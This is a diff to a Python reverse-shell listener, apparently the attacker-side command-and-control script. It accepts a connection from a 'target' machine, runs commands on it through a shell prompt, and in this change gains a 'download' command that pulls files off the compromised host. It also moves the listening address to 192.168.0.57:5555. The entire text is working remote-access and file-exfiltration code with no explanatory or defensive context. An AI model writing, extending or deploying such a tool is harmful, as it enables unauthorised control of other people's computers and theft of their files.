@@ -18,6 +18,19 @@ def receiver():
             continue
 
 
+def download_file(file_name):
+    with open(file_name, "wb") as f:
+        target.settimeout(1)
+        chunk = target.recv(1024)
+        while chunk:
+            f.write(chunk)
+            try:
+                chunk = target.recv(1024)
+            except socket.timeout as err:
+                break
+        target.settimeout(None)
+
+
 def target_communication():
     while True:
         command = input(f"* Shell~{ip}: ")
@@ -28,13 +41,15 @@ def target_communication():
             os.system("clear")
         elif command[:3] == "cd ":
             pass
+        elif command[:8] == "download":
+            download_file(command[9:])
         else:
             result = receiver()
             print(result)
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(("10.0.2.15", 5555))
+sock.bind(("192.168.0.57", 5555))
 print("[+] Listening for Incoming Connections")
 sock.listen(5)
 target, ip = sock.accept()
